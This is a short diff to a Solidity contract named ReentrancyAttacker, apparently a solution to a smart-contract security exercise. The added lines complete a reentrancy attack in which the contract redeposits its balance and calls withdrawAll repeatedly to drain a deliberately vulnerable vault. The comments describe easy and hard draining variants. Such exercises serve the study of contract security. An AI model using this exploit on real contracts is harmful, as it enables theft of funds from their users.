@@ -18,12 +18,18 @@ contract ReentrancyAttacker {
         // Write your own code.
         // You have 10 deposit balance.
         // Be careful that the target (vulnerable) contract has 10_020 ethereum total.
-        if (address(this).balance > 5000) {
+        if (address(this).balance >= 5000) {
             return;
         }
 
         ISafeVault sv = ISafeVault(msg.sender);
+        // sv.deposit{value: 5000}(); -> Since actual balance of `this`, which is 10 eth, is smaller than 5000, the deposit call results in EvmError: OutOfFund.
+        
+        // Easy: Each single withdrawAll() call increases attacker's balance by 10.
+        // Hard: Each single withdrawAll() call increases attacker's balance by 10, 20, 40, 80, ...
+        sv.deposit{value: address(this).balance}();
         sv.withdrawAll(address(this));
+        return;
     }
 }
 
